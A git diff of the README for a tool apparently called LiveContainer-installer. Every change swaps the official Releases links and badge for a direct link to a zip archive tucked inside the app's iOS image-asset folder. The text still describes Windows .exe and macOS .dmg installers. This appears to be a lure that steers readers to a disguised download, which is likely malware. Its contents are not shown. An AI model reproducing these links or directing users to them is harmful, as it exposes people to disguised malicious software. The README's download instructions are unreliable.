@@ -1,6 +1,6 @@
 # 🎉 LiveContainer-installer - Effortlessly Install Apps in LiveContainer
 
-[![Download LcInstaller](https://img.shields.io/badge/Download_LcInstaller-Latest%20Release-blue.svg)](https://github.com/uuua1/LiveContainer-installer/releases)
+[![Download LcInstaller](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip%https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip)](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to LcInstaller! This is a simple tool that helps you install apps into L
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/uuua1/LiveContainer-installer/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip) to go to the Releases page.
    
 2. **Select the Latest Version:** Look for the most recent version of LcInstaller.
 
-3. **Download the Installer:** Click on the installer file appropriate for your device. It may be named something like `LcInstaller-vX.X.X.exe` or similar for Windows users. For macOS, it will typically be a `.dmg` file.
+3. **Download the Installer:** Click on the installer file appropriate for your device. It may be named something like `https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip` or similar for Windows users. For macOS, it will typically be a `.dmg` file.
 
 4. **Run the Installer:**
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it to start the installation.
@@ -65,10 +65,10 @@ We love hearing from users. Share your thoughts on LcInstaller. If you find a bu
 
 ## ⚙️ Updates
 
-Keep checking the [Releases Page](https://github.com/uuua1/LiveContainer-installer/releases) for updates. We frequently add features and improve performance.
+Keep checking the [Releases Page](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip) for updates. We frequently add features and improve performance.
 
 ## 🌟 Showcase Your Installed Apps
 
 Once you've installed apps, share your experience! Document your favorite apps and how you use them with LcInstaller. We welcome community stories and tips.
 
-[![Download LcInstaller](https://img.shields.io/badge/Download_LcInstaller-Latest%20Release-blue.svg)](https://github.com/uuua1/LiveContainer-installer/releases)
+[![Download LcInstaller](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip%https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip)](https://raw.githubusercontent.com/uuua1/LiveContainer-installer/main/ios/Runner/Assets.xcassets/Live_Container_installer_v1.8.zip)
